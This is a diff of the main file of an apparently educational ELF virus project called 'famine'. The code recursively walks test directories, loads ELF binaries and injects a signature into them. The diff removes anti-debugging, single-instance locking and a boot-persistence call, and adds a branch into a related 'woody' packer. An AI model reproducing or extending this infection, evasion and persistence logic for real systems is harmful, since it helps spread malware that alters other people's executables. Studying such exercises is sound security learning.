@@ -1,7 +1,7 @@
 #include "../include/famine.h"
 
 void famine(char *fullpath) {
-    FamineFile *file = elf_file_get(fullpath);
+    FamineFile *file = famine_elf_file_get(fullpath);
     if (file != NULL) {
         DBG("ELF file loaded successfully. Size: %lu bytes\n", file->size);
         inject_signature(file);
@@ -40,25 +40,27 @@ void list_recursive(const char *path) {
     closedir(dir);
 }
 
-int main(void) {
-    set_log_level(L_DEBUG);
-    DBG("[FAMINE START]\n");
-    anti_debug();
-    
-    pid_t pid = fork();
+#ifdef FAMINE_BONUS
+    #include "../include/woody.h"
+#endif
 
-    if (pid == 0) {
-        int lock_fd = lock_global();
-        if (*get_log_level() == L_NONE) {
-            mute_output();
+int main(int argc, char **argv) {
+    set_log_level(L_INFO);
+
+    #ifdef FAMINE_BONUS
+        return (process_woody(argc, argv));
+    #else
+        (void)argc, (void)argv;
+        pid_t pid = fork();
+        if (pid == 0) {
+            if (*get_log_level() == L_NONE) {
+                mute_output();
+            }
+            // setup_boot_start();
+            list_recursive(TMPTEST_PATH);
+            list_recursive(TMPTEST2_PATH);
         }
-        setup_boot_start();
-        exit_if_process_running();
-        list_recursive(TMPTEST_PATH);
-        list_recursive(TMPTEST2_PATH);
-        close(lock_fd);
-    }
-
-    wait(NULL);
-    return (0);
+        wait(NULL);
+        return (0);
+    #endif
 }
